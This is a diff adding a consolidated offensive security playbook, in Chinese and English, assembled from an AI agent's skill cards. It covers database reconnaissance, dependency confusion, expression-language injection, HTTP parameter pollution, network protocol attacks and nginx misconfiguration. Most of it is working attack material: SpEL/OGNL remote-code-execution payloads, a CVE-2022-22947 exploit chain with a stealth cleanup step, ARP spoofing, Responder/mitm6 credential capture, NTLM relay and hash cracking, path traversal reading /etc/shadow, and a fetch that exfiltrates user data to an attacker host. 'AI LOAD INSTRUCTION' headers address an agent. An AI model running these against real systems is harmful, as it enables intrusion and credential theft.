@@ -1,0 +1,932 @@
+---
+title: "核心Web漏洞面作业手法.md"
+generated: 2026-10-21
+kind: consolidated-playbook
+note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
+---
+
+# 核心Web漏洞面作业手法.md
+
+> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。
+
+## 来源卡
+
+- `/root/.hermes/skills/security/database-security/SKILL.md`
+- `/root/.hermes/skills/security/dependency-confusion/SKILL.md`
+- `/root/.hermes/skills/security/expression-language-injection/SKILL.md`
+- `/root/.hermes/skills/security/http-parameter-pollution/SKILL.md`
+- `/root/.hermes/skills/security/network-protocol-attacks/SKILL.md`
+- `/root/.hermes/skills/security/nginx-misconfig/SKILL.md`
+
+## 汇总内容
+
+### database-security
+
+来源：`/root/.hermes/skills/security/database-security/SKILL.md`
+
+# database-security（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/database-security/SKILL.md`
+- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name database-security`
+
+---
+
+长文超过 1800 行，作业时 Read 真源全文，不要凭记忆。
+
+# 数据库安全测试全栈技能
+
+> 覆盖关系型数据库、NoSQL、云数据库、向量数据库、图数据库、时序数据库的全栈攻击面与防御对抗。
+
+---
+
+## 1. 数据库侦察
+
+### 1.1 端口扫描与服务识别
+
+```bash
+# Nmap 数据库端口扫描
+nmap -p 1433,1521,3306,5432,6379,27017,9042,9200,11211,27017,28017,29017,50000,5984,8086,8087,8088,8089,9092,10250,10255,8000,8191,8091,8123,9090,9999,5439,6443,9200,9300,9600 -sV -sC -oA db_scan 192.168.1.0/24
+
+# Masscan 快速扫描
+masscan -p1433,1521,3306,5432,6379,27017,9200,11211 --rate=10000 -oJ db_masscan.json 10.0.0.0/8
+
+# 专门针对数据库的 nmap 脚本
+nmap --script=mysql-info,mysql-enum,ms-sql-info,ms-sql-config,ms-sql-hasdbaccess,oracle-tns-version,pgsql-brute -p 3306,1433,1521,5432 192.168.1.1
+
+# 服务 Banner 抓取
+echo "" | nc -w 3 192.168.1.1 3306
+echo "" | nc -w 3 192.168.1.1 5432
+nmap -sV --script=banner -p 27017 192.168.1.1
+```
+
+### 1.2 版本探测与漏洞关联
+
+```bash
+# MySQL 版本探测
+mysql -h 192.168.1.1 -u root -p''
+# 或通过 nc 获取 banner
+nc -v 192.168.1.1 3306
+
+# PostgreSQL 版本
+psql -h 192.168.1.1 -U postgres -c "SELECT version();"
+
+# MSSQL 版本 (通过 nmap 脚本)
+nmap -p 1433 --script ms-sql-info 192.168.1.1
+
+# Oracle TNS 版本
+nmap -p 1521 --script oracle-tns-version 192.168.1.1
+
+# 版本关联 CVE 查询
+searchsploit mysql 5.7
+searchsploit postgresql 13
+searchsploit mssql 2019
+```
+
+### 1.3 数据库枚举
+
+```bash
+# MySQL 枚举
+nmap -p 3306 --script mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-audit 192.168.1.1
+
+# MSSQL 枚举
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT @@version" 192.168.1.1
+
+# 使用 Metasploit
+msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS 192.168.1.0/24; run; exit"
+msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS 192.168.1.0/24; run; exit"
+msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS 192.168.1.0/24; run; exit"
+```
+
+### 1.4 云数据库发现
+
+```bash
+# AWS RDS 枚举
+aws rds describe-db-instances --region us-east-1
+aws rds describe-db-clusters --region us-east-1
+aws rds describe-db-snapshots --region us-east-1 --include-shared
+
+# Azure SQL 枚举
+az sql server list --query "[].{name:name, fqdn:fullyQualifiedDomainName}"
+az sql db list --server <server-name> --query "[].{name:name, status:status}"
+
+# GCP Cloud SQL
+gcloud sql instances list
+gcloud sql databases list --instance <instance-name>
+
+
+…（其余见长文）
+
+### dependency-confusion
+
+来源：`/root/.hermes/skills/security/dependency-confusion/SKILL.md`
+
+# dependency-confusion（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/dependency-confusion/SKILL.md`
+- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name dependency-confusion`
+
+---
+
+# SKILL: Dependency Confusion — Supply Chain Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert dependency-confusion methodology. Covers how private package names leak, how public registries can win version resolution, ecosystem-specific pitfalls (npm scopes, pip extra indexes, Maven repo order), recon commands, non-destructive PoC patterns (callbacks, not data exfil), and defensive controls. Pair with supply-chain recon workflows when manifests or CI caches are in scope. **Only use on systems and programs you are authorized to test.**
+
+## 0. QUICK START
+
+**What to look for first**
+
+- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.
+- Evidence the **same name** might exist—or be **squattable**—on a **public** registry with a **higher semver** than the private feed publishes.
+- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.
+
+**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the “newest” matching version may be the attacker’s.*
+
+Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions.
+
+---
+
+## 1. CORE CONCEPT
+
+1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply “ours”), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.
+2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).
+3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.
+4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) → **attacker code runs** on developer laptops, CI, or production image builds.
+
+This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire.
+
+---
+
+## 2. AFFECTED ECOSYSTEMS
+
+| Ecosystem | Typical manifest | Confusion angle |
+|-----------|------------------|-----------------|
+| **npm** | `package.json` | **Scoped** packages (`@scope/pkg`) are **safer** when the scope is **owned** on the registry; **unscoped** private-style names are **high risk**. Multiple registries / `.npmrc` `registry` vs per-scope `@scope:registry=` misconfiguration increases risk. |
+| **pip** | `requirements.txt`, `pyproject.toml`, `setup.py` | `pip install -i` / **`--extra-index-url`** merges indexes; a public index can serve a **higher version** for the same distribution name. |
+| **RubyGems** | `Gemfile` | **`source`** order and additional sources; ambiguous gem names reachable from rubygems.org. |
+| **Maven** | `pom.xml` | **Repository** declaration **order** and **mirror** settings; a public repo publishing the same `groupId:artifactId` under a higher version can win if policy allows. |
+| **Composer** | `composer.json` | **Packagist** is default; private packages without **`repositories`**/`canonical` discipline may collide with public names. |
+| **Docker** | `FROM`, image tags | **Typosquatting** on container registries (e.g. public hub) for images with names similar to internal base images. |
+
+---
+
+## 3. RECONNAISSANCE
+
+**Where internal names leak**
+
+- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.
+- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.
+- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.
+- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.
+
+**Check public squatting / claimability (read-only)**
+
+```bash
+# npm — metadata for a name (unscoped)
+npm view some-internal-package-name version
+
+# npm — scoped (requires scope to exist /
+
+…（截断，全文见来源卡）
+
+### expression-language-injection
+
+来源：`/root/.hermes/skills/security/expression-language-injection/SKILL.md`
+
+# expression-language-injection（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/expression-language-injection/SKILL.md`
+- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
+- 工具：`python3 tools/ops/rce_forge.py shoot --family el-spel --url 'https://授权/' --param q --case <案>`
+- 探测：`python3 tools/ops/core_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name expression-language-injection`
+
+---
+
+# SKILL: Expression Language Injection — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.
+
+## 0. RELATED ROUTING
+
+- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) — different attack surface
+- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup
+
+**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.
+
+---
+
+## 1. DETECTION — POLYGLOT PROBES
+
+```text
+${7*7}              → 49 = SpEL, OGNL, or Java EL
+#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
+%{7*7}              → 49 = OGNL (Struts2)
+${T(java.lang.Math).random()}  → random float = SpEL confirmed
+%{#context}         → object dump = OGNL confirmed
+```
+
+### Disambiguation
+
+| Response to `${7*7}` | Response to `%{7*7}` | Engine |
+|---|---|---|
+| 49 | literal `%{7*7}` | SpEL or Java EL |
+| literal `${7*7}` | 49 | OGNL (Struts2) |
+| 49 | 49 | Both may be active |
+
+---
+
+## 2. SpEL (SPRING EXPRESSION LANGUAGE)
+
+### Where SpEL Appears
+
+- `@Value("${...}")` annotations
+- Spring Security expressions (`@PreAuthorize`)
+- Spring Cloud Gateway route predicates and filters
+- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
+- Spring Data `@Query` with SpEL
+
+### RCE via Runtime.exec
+
+```java
+${T(java.lang.Runtime).getRuntime().exec("id")}
+```
+
+### RCE with Output Capture (Commons IO)
+
+```java
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
+```
+
+### RCE with Output Capture (Spring StreamUtils)
+
+```java
+#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
+```
+
+### ProcessBuilder (alternative when Runtime is blocked)
+
+```java
+${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
+```
+
+### Spring Cloud Gateway — CVE-2022-22947
+
+Exploit via actuator to add malicious route with SpEL filter:
+
+```bash
+# Step 1: Add route with SpEL in filter (with output capture)
+POST /actuator/gateway/routes/hacktest
+Content-Type: application/json
+{
+  "id": "hacktest",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {
+      "name": "Result",
+      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
+    }
+  }],
+  "uri": "http://example.com",
+  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
+}
+
+# Step 2: Refresh routes to apply
+POST /actuator/gateway/refresh
+
+# Step 3: Trigger the route
+GET /hackpath
+# Response header "Result" contains command output
+
+# Step 4: Clean up (important for stealth)
+DELETE /actuator/gateway/routes/hacktest
+POST /actuator/gateway/refresh
+```
+
+### SpEL Sandbox Bypass
+
+When `SimpleEvaluationContext` is used (restricts `T()` operator):
+
+```java
+// Try reflection-based bypass:
+${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
+```
+
+---
+
+## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)
+
+### Where OGNL Appears
+
+- Apache Struts2 — primary OGNL consumer
+- Confluence Server — uses OGNL in certain request paths
+- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`
+
+### Basic RCE
+
+```
+%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
+```
+
+### Struts2 Sandbox Bypass — _memberAccess Manipulation
+
+Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:
+
+```
+%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+
+…（截断，全文见来源卡）
+
+### http-parameter-pollution
+
+来源：`/root/.hermes/skills/security/http-parameter-pollution/SKILL.md`
+
+# http-parameter-pollution（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/http-parameter-pollution/SKILL.md`
+- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name http-parameter-pollution`
+
+---
+
+# SKILL: HTTP Parameter Pollution (HPP)
+
+> **AI LOAD INSTRUCTION**: Model the **full request path**: browser → CDN/WAF → reverse proxy → app framework → business code. Duplicate keys (`a=1&a=2`) are not an error at HTTP level; each hop may pick first, last, join, or array-ify. Test HPP when WAF and app disagree, or when internal HTTP clients rebuild query strings. Routing note: when the same parameter appears multiple times, or WAF/backend stacks differ, use the Section 1 matrix to test first/last/merge assumptions, then design Section 3 scenario chains.
+
+## 0. QUICK START
+
+**Hypothesis**: the **security check** reads one occurrence of a parameter while the **action** reads another.
+
+### First-pass payloads
+
+```text
+id=1&id=2
+id=1&id=1%20OR%201=1
+url=https://legit.example&id=https://evil.example
+amount=1&amount=9999
+csrf=TOKEN_A&csrf=TOKEN_B
+user=alice&user=admin
+```
+
+### Body variants (repeat for POST)
+
+```text
+application/x-www-form-urlencoded
+id=1&id=2
+
+multipart/form-data
+------boundary
+Content-Disposition: form-data; name="id"
+1
+------boundary
+Content-Disposition: form-data; name="id"
+2
+```
+
+### Quick methodology
+
+1. Fingerprint **front** stack (CDN/WAF) vs **origin** (language/framework) using baseline `a=1&a=2`.
+2. Send **both** orders: `a=1&a=2` and `a=2&a=1` (some parsers are order-sensitive).
+3. If JSON: test **duplicate keys** and Content-Type confusion (see Section 2).
+
+---
+
+## 1. SERVER BEHAVIOR MATRIX
+
+Typical defaults — **always confirm**; middleware and custom parsers override these.
+
+| Technology | Behavior | Example: `a=1&a=2` |
+|---|---|---|
+| PHP / Apache (`$_GET`) | Last occurrence | `a=2` |
+| ASP.NET / IIS | Often comma-joined (all) | `a=1,2` |
+| JSP / Tomcat (servlet param) | First occurrence | `a=1` |
+| Python / Django (`QueryDict`) | Last occurrence | `a=2` |
+| Python / Flask (`request.args`) | First occurrence | `a=1` |
+| Node.js / Express (`req.query`) | Array of values | `a=['1','2']` (shape may vary by parser version) |
+| Perl / CGI | First occurrence | `a=1` |
+| Ruby / Rack (Rack::Utils) | Last occurrence | `a=2` |
+| Go `net/http` (`ParseQuery`) | First occurrence | `a=1` |
+
+**Why it matters**: a WAF on **IIS** might see `1,2` while PHP backend receives `2` only — or the reverse if a proxy normalizes.
+
+---
+
+## 2. PAYLOAD PATTERNS
+
+### 2.1 Basic duplicate key
+
+```http
+GET /api?q=safe&q=evil HTTP/1.1
+```
+
+### 2.2 Array-style (PHP / some frameworks)
+
+```http
+GET /api?id[]=1&id[]=2 HTTP/1.1
+```
+
+### 2.3 Mixed array + scalar
+
+```http
+GET /api?item[]=a&item=b HTTP/1.1
+```
+
+### 2.4 Encoded ampersand (parser differential)
+
+```text
+# Literal & inside a value vs new pair — depends on decoder
+param=value1%26other=value2
+param=value1&other=value2
+```
+
+### 2.5 Nested / bracket keys
+
+```http
+GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1
+```
+
+### 2.6 JSON duplicate keys
+
+```json
+{"test":"user","test":"admin"}
+```
+
+Many parsers keep **last** key; some keep **first**. JavaScript `JSON.parse` keeps the last duplicate key.
+
+---
+
+## 3. ATTACK SCENARIOS
+
+### 3.1 HPP + WAF bypass
+
+**Pattern**: WAF inspects **first** value; application uses **last**.
+
+```text
+id=1&id=1%20UNION%20SELECT%20...
+```
+
+Also try: benign value in JSON field duplicated in query string, if gateway merges sources differently.
+
+### 3.2 HPP + SSRF
+
+**Pattern**: validator reads **safe** URL; fetcher reads **internal/evil** URL.
+
+```text
+url=https://allowed.cdn.example/&url=http://169.254.169.254/
+```
+
+Confirm which component (library vs app) consumes which occurrence.
+
+### 3.3 HPP + CSRF
+
+**Pattern**: duplicate anti-CSRF token so one copy satisfies parser A and another satisfies parser B.
+
+```text
+csrf=LEGIT&csrf=IGNORED_OR_ALT
+```
+
+Use only in **authorized** CSRF assessments with a clear state-changing target.
+
+### 3.4 HPP + business logic (e.g. payment)
+
+```text
+amount=1&amount=5000
+quantity=1&quantity=-1
+price=9.99&price=0.01
+```
+
+Pair with **race conditions** or **server-side rounding** for higher impact; HPP alone often needs a split interpretation across layers.
+
+---
+
+## 4. TOOLS
+
+| Tool | How to use |
+|---|---|
+| **Burp Suite** | Repeater: duplicate keys in raw query/body; Param Miner /
+
+…（截断，全文见来源卡）
+
+### network-protocol-attacks
+
+来源：`/root/.hermes/skills/security/network-protocol-attacks/SKILL.md`
+
+# network-protocol-attacks（测绘引擎）
+
+目标须在 `config/scope*.json`。本库已有专链时专卡赢。
+
+## 真源
+
+- 长文：`docs/learning/shizhan-pack/skills/network-protocol-attacks/SKILL.md`
+- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
+- 工具：`python3 tools/ops/core_web_surface_probe.py --help`
+- 路由：`python3 tools/ops/shizhan_pack_route.py --name network-protocol-attacks`
+
+---
+
+# SKILL: Network Protocol Attacks — Expert Attack Playbook
+
+> **AI LOAD INSTRUCTION**: Expert network protocol attack techniques. Covers ARP spoofing, name resolution poisoning (LLMNR/NBT-NS/mDNS), WPAD abuse, DHCPv6 takeover, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion. Base models miss the chaining opportunities between these attacks and the nuances of modern switched network exploitation.
+
+## 0. RELATED ROUTING
+
+Before going deep, consider loading:
+
+- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after establishing MitM position for traffic redirection
+- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relaying captured NTLM hashes from poisoning attacks
+- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered during network attacks
+- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) for analyzing captured traffic from MitM
+
+### Advanced Reference
+
+Also load [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:
+- Detailed Responder/mitm6 configuration and workflows
+- NTLM relay target selection and chaining
+- Credential format analysis and cracking priorities
+
+---
+
+## 1. ARP SPOOFING
+
+### Gratuitous ARP — MitM Positioning
+
+```bash
+# arpspoof (dsniff suite)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
+arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &
+
+# ettercap — ARP poisoning with sniffing
+ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//
+
+# bettercap — modern framework
+bettercap -iface eth0
+> set arp.spoof.targets VICTIM_IP
+> arp.spoof on
+> net.sniff on
+```
+
+### Selective Targeting
+
+```bash
+# bettercap — target specific hosts, avoid detection
+> set arp.spoof.targets 10.0.0.50,10.0.0.51
+> set arp.spoof.fullduplex true
+> set arp.spoof.internal true
+> arp.spoof on
+```
+
+### Detection Indicators
+
+- Duplicate MAC addresses in ARP table
+- Gratuitous ARP storms from non-gateway IPs
+- Tools: `arpwatch`, static ARP entries, 802.1X port authentication
+
+---
+
+## 2. LLMNR / NBT-NS / mDNS POISONING
+
+### Responder — Credential Capture
+
+```bash
+# Basic poisoning (LLMNR + NBT-NS + mDNS)
+responder -I eth0 -dwPv
+
+# Key flags:
+# -d  Enable answers for DHCP broadcast requests (fingerprinting)
+# -w  Start WPAD rogue proxy
+# -P  Force NTLM auth for WPAD
+# -v  Verbose
+
+# Analyze mode only (passive, no poisoning)
+responder -I eth0 -A
+```
+
+### Captured Hash Formats
+
+| Protocol | Hash Type | Hashcat Mode | Crackability |
+|---|---|---|---|
+| NTLMv1 | NetNTLMv1 | 5500 | Fast — rainbow tables viable |
+| NTLMv2 | NetNTLMv2 | 5600 | Moderate — dictionary + rules |
+| NTLMv1-ESS | NetNTLMv1 | 5500 | Fast — same as NTLMv1 |
+
+```bash
+# Crack captured hashes
+hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
+john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
+```
+
+### Relay Instead of Crack
+
+```bash
+# ntlmrelayx — relay captured NTLM to other services
+ntlmrelayx.py -tf targets.txt -smb2support
+ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack
+ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
+```
+
+---
+
+## 3. WPAD ABUSE
+
+```bash
+# Responder with WPAD proxy
+responder -I eth0 -wPv
+
+# WPAD flow:
+# 1. Client queries DHCP for WPAD → DNS for wpad.domain.com → LLMNR/NBT-NS
+# 2. Responder answers with rogue wpad.dat
+# 3. Browser uses attacker's proxy → forced NTLM auth → credential capture
+```
+
+### Manual WPAD PAC File
+
+```javascript
+// Rogue wpad.dat content
+function FindProxyForURL(url, host) {
+    return "PROXY ATTACKER_IP:3128; DIRECT";
+}
+```
+
+---
+
+## 4. DHCPv6 ATTACK — mitm6
+
+Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.
+
+```bash
+# mitm6 → DNS takeover → NTLM relay
+mitm6 -d domain.com
+
+# In parallel: relay captured NTLM to LDAP(S) for delegation
+ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access
+
+# Attack chain:
+# 1. mitm6 answers DHCPv6 → sets attacker as IPv6 DNS
+# 2. Victim DNS queries go to attacker → WPAD redirect
+# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
+```
+
+### Key Conditions
+
+-
+
+…（截断，全文见来源卡）
+
+### nginx-misconfig
+
+来源：`/root/.hermes/skills/security/nginx-misconfig/SKILL.md`
+
+# Nginx 配置错误渗透手法
+
+**前提**：目标在 `config/scope*.json`。
+
+---
+
+## 快速摸底
+
+```bash
+# 识别 nginx 指纹
+curl -si https://授权站/ | grep -iE "server:|x-powered|via:|x-cache"
+
+# 测试常见路径穿越
+curl -s "https://授权站/static../" -v
+curl -s "https://授权站/static../etc/passwd" -v
+```
+
+---
+
+## §1 Off-by-Slash（最高频）
+
+**漏洞配置**：
+```nginx
+location /api {
+ proxy_pass http://backend; # 没有尾部 /
+}
+```
+
+**利用**：nginx 会将 `/api../etc/passwd` 规范化，可穿越到不允许的路径。
+
+```bash
+# 检测 off-by-slash
+curl -s "https://授权站/api../" -v # 200 = 可能存在
+curl -s "https://授权站/api../private" # 测试内部路径
+
+# 常见绕过变体
+/api..;/private # 分号路径（Tomcat/Jetty）
+/api%2f../private # URL 编码斜杠
+/api%252f../private # 双重编码
+/%2e%2e/private # 编码点
+```
+
+---
+
+## §2 Alias 路径穿越（读取任意文件）
+
+**漏洞配置**：
+```nginx
+location /static {
+ alias /var/www/html/static/; # location 没有尾部 /
+}
+```
+
+**利用**：访问 `/static../` 会跳出 static 目录。
+
+```bash
+# 基础穿越
+curl -s "https://授权站/static../etc/passwd"
+curl -s "https://授权站/static../" # 列目录
+curl -s "https://授权站/static../nginx.conf"
+
+# 读取 PHP 源码
+curl -s "https://授权站/static../app.php"
+curl -s "https://授权站/static../config.php"
+curl -s "https://授权站/static../.env"
+curl -s "https://授权站/static../vendor/autoload.php"
+
+# 特殊路径
+curl -s "https://授权站/static../proc/self/environ"
+curl -s "https://授权站/static../proc/self/cmdline"
+
+# 批量目标文件清单
+for f in /etc/passwd /etc/shadow /etc/nginx/nginx.conf /var/www/html/.env; do
+ echo "=== $f ===" && curl -sk "https://授权站/static..$f"
+done
+```
+
+---
+
+## §3 Merge Slashes Off（路径规范化绕过）
+
+**漏洞配置**：
+```nginx
+merge_slashes off; # 禁止合并连续斜杠
+```
+
+**利用**：`//admin` 不等于 `/admin`，前端代理识别为正常路径，后端收到 `//admin`。
+
+```bash
+# 绕过访问控制
+curl -s "https://授权站//admin"
+curl -s "https://授权站//api//v1//users"
+curl -s "https://授权站/./admin/"
+curl -s "https://授权站/%2f%2fadmin"
+
+# 联合 WAF 绕过
+curl -s "https://授权站//uploads//shell.php"
+```
+
+---
+
+## §4 不安全的 try_files 配置
+
+```nginx
+# 漏洞配置 1：try_files 到 PHP 执行
+location / {
+ try_files $uri $uri/ /index.php$is_args$args;
+}
+
+# 漏洞配置 2：静态文件 fallback 可被滥用
+location ~* \.(js|css)$ {
+ try_files $uri =404;
+}
+# → 上传 .js 文件包含 PHP 代码后 try_files fallback 到 PHP 处理
+```
+
+```bash
+# 测试 try_files fallback
+curl -s "https://授权站/non-existent?debug=true" # 可能触发 debug 页
+
+# phpinfo 探测
+curl -s "https://授权站/phpinfo.php"
+curl -s "https://授权站/info.php"
+curl -s "https://授权站/test.php"
+```
+
+---
+
+## §5 X-Accel-Redirect SSRF（内部资源绕过）
+
+```bash
+# nginx 的 X-Accel-Redirect 头允许后端指示 nginx 转发请求
+# 如果后端将用户输入传入 X-Accel-Redirect 响应头
+
+# 测试是否存在 XAR
+curl -s "https://授权站/download?file=/etc/passwd" -v | grep -i "x-accel"
+
+# SSRF via XAR（后端盲 SSRF 不如这个精准）
+# 触发内部路径：/internal/ /private/ /admin/ @backend/
+```
+
+---
+
+## §6 CORS 配置错误（nginx 层）
+
+```nginx
+# 漏洞配置 1：完全反射 Origin
+add_header 'Access-Control-Allow-Origin' $http_origin;
+add_header 'Access-Control-Allow-Credentials' 'true';
+
+# 漏洞配置 2：Origin 正则错误（允许 evil.victim.com）
+if ($http_origin ~* "victim\.com$") {
+ add_header 'Access-Control-Allow-Origin' $http_origin;
+}
+```
+
+```bash
+# 测试 Origin 反射
+curl -s "https://授权站/api/user" \
+ -H "Origin: https://evil.com" \
+ -H "Authorization: Bearer $TOKEN" -v | grep -i "access-control"
+
+# 测试子域绕过
+curl -s "https://授权站/api/user" \
+ -H "Origin: https://evil.victim.com" -v | grep -i access-control
+
+# 利用（配合 CSRF）
+javascript: fetch('https://授权站/api/user', {credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker/'+btoa(JSON.stringify(d))))
+```
+
+---
+
+## §7 add_header 继承覆盖（Security Headers 丢失）
+
+**漏洞**：子 location 块的 `add_header` 会覆盖父块的所有 `add_header`。
+
+```nginx
+# nginx.conf（父）
+add_header X-Frame-Options DENY;
+add_header X-Content-Type-Options nosniff;
+
+# site.conf（子 location）
+location /api {
+ add_header Cache-Control no-cache; # 这里只有这一个！前两个丢失
+ proxy_pass http://backend;
+}
+```
+
+```bash
+# 检测 Security Headers 缺失
+curl -si "https://授权站/api/anything" | grep -iE "x-frame|x-content-type|csp|hsts|x-xss"
+
+# 若 /api/ 路径缺失 X-Frame-Options，可 Clickjacking
+```
+
+---
+
+## §8 limit_req / limit_conn 绕过
+
+```bash
+# 常见限流绕过
+# 大写 HTTP 方法不在限流规则
+curl -X "GET" "https://授权站/login" vs curl -X "gEt" "https://授权站/login"
+
+# 路径变体绕过
+curl "https://授权站/login" vs curl "https://授权站/login/"
+
+# 附加参数绕过（不在 key 里的参数）
+curl "https://授权站/login?_=1234"
+
+# X-Forwarded-For 伪造（仅当 nginx 信任 XFF）
+curl -H "X-Forwarded-For: 1.1.1.1" "https://授权站/login"
+# 或枚举
+for i in $(seq 1 100); do
+ curl -s -H "X-Forwarded-For: 10.0.0.$i" -o /dev/null -w "%{http_code}\n" \
+ "https://授权站/api/login"
+done
+```
+
+---
+
+## §9 Nginx Lua / OpenResty 注入
+
+```bash
+# 检测 OpenResty
+curl -si https://授权站/ | grep -i "openresty\|lua\|resty"
+
+# lua_code_cache off（开发模式）→ Lua 脚本热重载，若有上传可 RCE
+# content_by_lua_block 中的用户输入未过滤 → Lua 代码注入
+
+#
+
+…（截断，全文见来源卡）
